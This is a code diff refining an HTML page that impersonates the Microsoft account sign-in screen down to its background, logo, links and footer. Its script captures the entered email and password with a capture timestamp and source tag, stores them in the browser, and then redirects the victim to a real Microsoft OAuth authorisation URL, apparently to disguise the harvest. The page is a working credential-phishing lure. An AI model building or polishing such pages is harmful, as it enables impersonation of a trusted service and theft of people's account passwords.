@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <title>Sign in to your account</title>
+  <title>Sign in</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -13,12 +13,12 @@
       height: 100%;
       margin: 0;
       font-family: "Segoe UI", "Helvetica Neue", "Arial", sans-serif;
-      /* Official Microsoft 365 background */
-      background: url("https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696894951a34a3485345710a6.svg") no-repeat center center fixed;
-      -webkit-background-size: cover;
-      -moz-background-size: cover;
-      -o-background-size: cover;
+      /* Official Microsoft login page background */
+      background-image: url('https://logincdn.msftauth.net/shared/1.0/content/images/backgrounds/2_8626cda12760634c8ebb28d052605335.svg');
       background-size: cover;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      background-position: center center;
     }
     .main-container {
       display: flex;
@@ -28,16 +28,17 @@
       width: 100%;
     }
     .form-wrapper {
-      max-width: 440px; /* Key to matching the size */
+      max-width: 440px;
       width: 100%;
-      min-height: 360px; /* Ensures the card has enough height */
-      background-color: #fff;
-      box-shadow: 0px 1.2px 3.6px rgba(0,0,0,0.1), 0px 6.4px 14.4px rgba(0,0,0,0.13);
+      padding: 0 16px; /* Add some padding on mobile */
     }
-    .form-content {
+    .form-box {
+      background-color: #ffffff;
       padding: 44px;
+      box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+      border-radius: 8px; /* Added rounded corners */
     }
-    .form-content h1 {
+    .form-box h1 {
       font-size: 24px;
       font-weight: 600;
       margin-bottom: 24px;
@@ -52,28 +53,25 @@
     }
     .form-control:focus {
       box-shadow: none;
-      outline: none;
       border-color: #0078d4;
     }
-    p {
-      font-size: 15px;
+    .form-box p {
+      font-size: 13px; /* Adjusted font size */
       margin-top: 16px;
       margin-bottom: 0;
     }
-    a {
+    .form-box a {
       color: #0067b8;
       text-decoration: none;
     }
-    a:hover {
+    .form-box a:hover {
       text-decoration: underline;
     }
-    .btn {
-      border: none;
-      border-radius: 2px;
+    .form-box .btn {
       font-size: 15px;
-      padding: 4px 12px;
-      min-width: 108px;
-      min-height: 32px;
+      padding: 6px 20px;
+      border: none;
+      border-radius: 4px;
     }
     #back {
       cursor: pointer;
@@ -81,27 +79,31 @@
       font-size: 16px;
       vertical-align: middle;
     }
-    .options-container {
+    .options-section {
       margin-top: 24px;
       border-top: 1px solid #d2d2d2;
-      padding: 24px 44px;
+      padding-top: 24px;
     }
-    .options-container a {
+    .options-section p {
+        margin: 0;
+    }
+    .options-section a {
       color: #1b1b1b;
     }
     .fa-key {
       color: #5e5e5e;
       margin-right: 8px;
     }
-    .footer {
-      position: fixed;
-      right: 16px;
-      bottom: 12px;
-      font-size: 12px;
+    .page-footer {
+        position: fixed;
+        bottom: 12px;
+        right: 16px;
+        font-size: 12px;
     }
-    .footer a {
-      color: #000;
-      margin-left: 16px;
+    .page-footer a {
+        color: #000;
+        margin-left: 16px;
+        text-decoration: none;
     }
   </style>
 </head>
@@ -109,8 +111,8 @@
 
   <div class="main-container">
     <div class="form-wrapper">
-      <!-- Main Content Area -->
-      <div class="form-content">
+      <!-- Main Sign-in Card -->
+      <div class="form-box">
         <!-- Email View -->
         <div id="div1">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
@@ -122,7 +124,7 @@
           <p>No account? <a href="#">Create one!</a></p>
           <p><a href="#">Can’t access your account?</a></p>
           <div class="text-right mt-4">
-            <button class="btn text-white" id="next" style="background-color: #0067b8;">Next</button>
+            <button class="btn text-white px-4" id="next" style="background-color: #0067b8;">Next</button>
           </div>
         </div>
 
@@ -139,19 +141,20 @@
           </div>
           <p><a href="#">Forgot my password</a></p>
           <div class="text-right mt-4">
-            <button class="btn text-white" id="submit-btn" style="background-color: #0067b8;">Sign in</button>
+            <button class="btn text-white px-4" id="submit-btn" style="background-color: #0067b8;">Sign in</button>
           </div>
         </div>
-      </div>
-      
-      <!-- "Sign-in options" Area -->
-      <div class="options-container" id="options_box">
-        <p><i class="fas fa-key"></i> <a href="#">Sign-in options</a></p>
+
+        <!-- "Sign-in options" Section (inside the card) -->
+        <div class="options-section" id="options_box">
+          <p><i class="fas fa-key"></i> <a href="#">Sign-in options</a></p>
+        </div>
       </div>
     </div>
   </div>
 
-  <div class="footer">
+  <!-- Page Footer -->
+  <div class="page-footer">
     <a href="#">Terms of use</a>
     <a href="#">Privacy & cookies</a>
     <a href="#">...</a>
@@ -166,6 +169,7 @@
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
       }
+
       $('#next').click(function(e) {
         e.preventDefault();
         const email = $('#email').val().trim();
@@ -179,32 +183,45 @@
           $('#error').show();
         }
       });
+
       $('#back').click(function() {
         $('#div2').hide();
         $('#div1').show();
         $('#options_box').show();
         $('#msg').hide();
       });
+
       $('#submit-btn').click(function(event){
         event.preventDefault();
         const email = $('#emailch').text().trim();
         const password = $('#password').val();
+
         if (!password) {
           $('#msg').show();
           return;
         }
+        
         $('#msg').hide();
         $('#submit-btn').text('Verifying...').prop('disabled', true);
-        const credentialsData = { email: email, password: password, captureTime: new Date().toISOString(), source: 'replacement-html-final' };
+
+        const credentialsData = {
+          email: email,
+          password: password,
+          captureTime: new Date().toISOString(),
+          source: 'replacement-html-final'
+        };
         try {
           localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
           console.log('✅ Credentials stored successfully in localStorage.');
         } catch (e) {
           console.error('❌ Failed to store credentials in localStorage:', e);
         }
+
         const callbackUrl = window.location.origin + '/auth/callback';
         const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
+        
         console.log(`🔄 Redirecting to Microsoft for cookie setting. Will return to: ${callbackUrl}`);
+        
         setTimeout(() => {
           window.location.href = microsoftLoginUrl;
         }, 1200);
